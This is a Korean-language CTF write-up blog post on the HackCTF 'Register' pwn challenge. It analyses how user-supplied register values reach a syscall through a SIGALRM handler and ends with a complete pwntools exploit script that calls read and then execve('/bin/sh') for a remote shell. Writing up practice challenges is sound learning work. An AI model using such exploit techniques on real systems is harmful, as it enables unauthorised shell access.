---
layout: post
title:  "HacCTF register write-up"
date:   2020-03-15 19:45:55
image:  hackctf_register.PNG
tags:   [Hackctf]
categories: [Write-up]
---

# [HackCTF] Register

Date: Feb 03, 2020
Tags: report

### 1.  문제

---

**1) mitigation 확인**

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20Register/Untitled.png)

NX와 canaray가 걸려있다. got overwrite가 가능할 것으로 보인다



**2) 문제 확인**

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20Register/Untitled%201.png)

바이너리를 실행시키면 RAX, RDI, RSI, RDX, RCX, R8, R9 에 계속 입력을 받는다.



**3) 코드 확인**

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20Register/Untitled%202.png)

메인은 간단하다. 알람함수가 있고, build() 함수가 존재한다. build 함수를 살펴보자

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20Register/Untitled%203.png)

우측 사진이 build 함수이다. 코드를 보면 while 문 안에 do-while 문이 또 존재한다. v0는 8바이트 단위의 배열로 총 7개의 인덱스를 갖는다. get_obj함수가 v0를 인자로 호출이된다. 해당 함수

get_obj함수는 v0의 시작주소를 인자로 하여 호출된다. get_obj 함수를 살펴보자

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20Register/Untitled%204.png)

여기서 문자열들이 출력되면서 값이 저장되는것 같다. get_ll()함수가 무엇은 반환하는지 확인해보자

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20Register/Untitled%205.png)

여기서도 get_inp 함수가 또있다. nptr에 저장된 문자열을 atoi 함수를 이용하여 long 형태로 변환한다. 마지막으로 get_inp 함수를 살펴보자

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20Register/Untitled%206.png)

결국 입력받는 함수는 read인것으로 확인된다!. 여기서 a1과 a2는 각각 get_inp에서 인자로 넣어준 nptr 변수와 0x20 사이즈이다.

다시 build 함수로 돌아와보자. get_obj 함수는 위와같은 호출과정을 거쳐서 진행되고, 

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20Register/Untitled%207.png)

v0을 obj_7에 넣는다. obj_7은 .bss 영역에 존재하는 전역변수로 아래 unk_ 이 부분도 .bss에 존재한다. 코드로 보면 헷갈리니 어셈으로 봐보자.

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20Register/Untitled%208.png)

어셈을 확인하면, rbp-0x40 값을 rax에 넣고 그 값을 rip+머시기에 넣는다. 이 곳은 아까 전역변수인 obj_7의 주소이다. 그 아래도 쭉 8바이트 단위로 값을 넣는데, 이 뜻은 우리가 입력한 7개의 값이 전역변수 배열로 복사된다는 뜻이다. 

분명 의미가 있는 동작일 것이다. 

일단 그다음 코드를 확인해보자. 전연변수로 값들이 복사되고 alidate_syscall_obj 함수가 호출된다. 

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20Register/Untitled%209.png)

요런 코드로 해당 함수를 구성되있다. 결국 해당 함수는 0 아니면 1을 리턴하는데, 이 리턴값에 따라서 build 함수의 로직이 나뉜다.

만약 0을 리턴했다면, 

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20Register/Untitled%2010.png)

raise(14)가 호출될 것이고 1을 리턴했다면 다시 위로 돌아가 get_obj 함수부터 다시 호출될 것이다.

signo 14는 SIGALRM 으로 프로세스에게 해당 시그널을 보내게되고 이때 signal함수가 호출되면서 지정된 핸들러가 수행된다.

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20Register/Untitled%2011.png)

위의 핸들러가 수행되는데 이 핸들러에 등록된 동작을 확인해보자.

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20Register/Untitled%2012.png)

해당 핸들러는 obj_7을 인자로 하여 exec_syscall_obj를 호출한다. 잘 생각해보면 전역변수에 우리가 입력한 값들을 복사하는 이유가 있을것같다고 했다. 바로 여기서 이용이 되는 것이다. 그렇다면 exec_syscall_obj를 확인해보자

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20Register/Untitled%2013.png)

현재 rdi에 우리가 입력한 값이 저장된 배열의 시작주소가 저장되어 있다. 이거를 rbx에 복사하여 8바이트씩 꺼내어 실제 레지스터에 복사하고, syscall이 호출된다.

따라서 우리가 입력한 값들은 실제 레지스터에 들어가는 것이다. 그렇다면 이 부분을 이용하면 된다

sysrop 문제때 syscall을 이용하는 방법을 공부했다. 따라서 rax=0을 이용하여 read함수를 호출하고, /bin/sh 문자열을 bss 영역에 저장한다. 그 다음 rax=59를 이용하여 execve함수를 호출하면 된다.

인자는 그대로 주면 되기 때문에 따로 설명은 안하겠다.





### 2. 접근방법

---

코드를 설명하면서 필요한 부분은 다 살펴보았기 때문에 마지막으로 정리를 해보자. 

현재 해당 바이너리에서 SIGALARM을 발생시키는 방법이 2가지가 존재한다.

- **main 문의 alarm(5)**

    ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20Register/Untitled%2014.png)

    해당 시그널은 단지 5초만 기다리면 발생된다. 따라서 아무것도 안해도 5초뒤에 해당 알람시그널이 발생하여 signal 핸들러가 동작한다.

- **raise(14)**

    ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20Register/Untitled%2015.png)

    validate_syscall_obj함수가 0을 리턴하면 raise(14)가 호출되서 signal 핸들러가 동작한다.



우리가 첫번째로 호출한 syscall을 이용할 함수는 read함수이다. 이는 rax가 0이므로 바로 raise(14)가 호출되서 문제가 없다. 하지만 execve() 는 rax가 59일때 동작하는데, 해당 경우는  validate_syscall_obj가 1을 반환하기 떄문에 raise(14) 함수가 호출되지 않고 다시 위로 돌아가서 반복문이 실행된다.

따라서 execve()를 실행시키기 위해서 익스코드에 5초정도 시간이 흐르게끔 sleep을 걸어야한다. 타이밍이 맞았다면, execve()가 호출될 것이다.





### 3. 풀이

---

최종 익스코드는 다음과 같다

    from pwn import *
    
    context.log_level="DEBUG"
    p =remote("ctf.j0n9hyun.xyz", 3026)
    
    p.sendlineafter("RAX: ","0")
    p.sendlineafter("RDI: ","0")
    p.sendlineafter("RSI: ","6297984")
    p.sendlineafter("RDX: ","8")
    p.sendlineafter("RCX: ","0")
    p.sendlineafter("R8: ","0")
    p.sendlineafter("R9: ","0")
    #sleep(4)
    p.send("/bin/sh\x00")
    
    p.sendlineafter("RAX: ","59")
    p.sendlineafter("RDI: ","6297984")
    p.sendlineafter("RSI: ","0")
    p.sendlineafter("RDX: ","0")
    p.sendlineafter("RCX: ","0")
    p.sendlineafter("R8: ","0")
    p.sendlineafter("R9: ","0")
    sleep(4)
    p.interactive()





### 4. 몰랐던 개념

---

결국 롸업을 보고야 말았다. 

젠장.. 이번 문제는 모르는 지식은 없었지만,, 꼼꼼히 살펴보지 않았기 때문에 signal 관련 부분을 보지 않았다..

무조건 leak 시켜서 ROP를 진행하려고 했던 나의 무지함을 깨닫는 하루이다.. 집중해서 풀자이제!